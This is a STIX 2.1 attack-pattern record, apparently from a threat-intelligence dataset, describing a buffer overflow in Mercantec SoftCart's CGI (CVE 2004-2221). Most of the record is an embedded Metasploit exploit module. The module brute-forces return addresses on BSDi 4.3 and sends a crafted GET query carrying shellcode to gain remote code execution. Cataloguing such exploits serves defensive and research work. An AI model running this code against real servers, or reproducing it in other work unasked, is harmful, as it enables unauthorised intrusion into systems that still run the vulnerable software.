{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f5f99063-903c-4af3-bc97-54bc3f7321ae",
    "created": "2024-08-14T16:35:11.627892Z",
    "modified": "2024-08-14T16:35:11.627899Z",
    "name": "Mercantec SoftCart CGI Overflow",
    "description": " This is an exploit for an undisclosed buffer overflow in the SoftCart.exe CGI as shipped with Mercantec's shopping cart software.  It is possible to execute arbitrary code by passing a malformed CGI parameter in an HTTP GET request.  This issue is known to affect SoftCart version 4.00b. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/bsdi/softcart/mercantec_softcart.rb",
            "external_id": "mercantec_softcart.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-2221"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Brute\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mercantec SoftCart CGI Overflow',\n      'Description'    => %q{\n        This is an exploit for an undisclosed buffer overflow\n        in the SoftCart.exe CGI as shipped with Mercantec's shopping\n        cart software.  It is possible to execute arbitrary code\n        by passing a malformed CGI parameter in an HTTP GET\n        request.  This issue is known to affect SoftCart version\n        4.00b.\n      },\n      'Author'         => [ 'skape', 'trew' ],\n      'References'     =>\n        [\n          [ 'CVE', '2004-2221'],\n          [ 'OSVDB', '9011'],\n          [ 'BID', '10926'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x27\\x5c\\x3c\\x3e\\x3b\\x22\\x60\\x7e\\x24\\x5e\\x2a\\x26\\x7c\\x7b\\x7d\\x28\\x29\\x3f\\x5d\\x5b\\x00\",\n          'MinNops'  => 16,\n          'Prepend'  => \"\\x6a\\x02\\x58\\x50\\x9a\\x00\\x00\\x00\\x00\\x07\\x00\\x85\\xd2\\x75\\x0a\\x31\\xc0\\x40\\x9a\\x00\\x00\\x00\\x00\\x07\\x00\",\n          'PrependEncoder' => \"\\x83\\xec\\x7f\",\n        },\n      'Platform'       => 'bsdi',\n      'Targets'        =>\n        [\n          [\n            'BSDi/4.3 Bruteforce',\n            {\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xefbf3000 },\n                  'Stop'  => { 'Ret' => 0xefbffffc },\n                  'Step'  => 0\n                }\n            },\n          ],\n        ],\n      'DisclosureDate' => '2004-08-19',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [ false, \"The target CGI URI\", '/cgi-bin/SoftCart.exe' ])\n      ])\n  end\n\n  def brute_exploit(address)\n    if not (@mercantec)\n      res = send_request_raw({\n        'uri'   => normalize_uri(datastore['URI'])\n      }, 5)\n      @mercantec = (res and res.body and res.body =~ /Copyright.*Mercantec/)\n      fail_with(Failure::NotFound, \"The target is not a Mercantec CGI\") if not @mercantec\n    end\n\n    buffer =\n      \"MAA+scstoreB\" +\n      rand_text_alphanumeric(512) +\n      [address['Ret']].pack('V') +\n      \"MSF!\" +\n      [address['Ret'] + payload.encoded.length].pack('V') +\n      payload.encoded\n\n    print_status(\"Trying #{\"%.8x\" % address['Ret']}...\")\n    res = send_request_raw({\n      'uri'   => normalize_uri(datastore['URI']),\n      'query' => buffer\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-08-19",
    "x_mitre_platforms": [
        "bsdi'"
    ]
}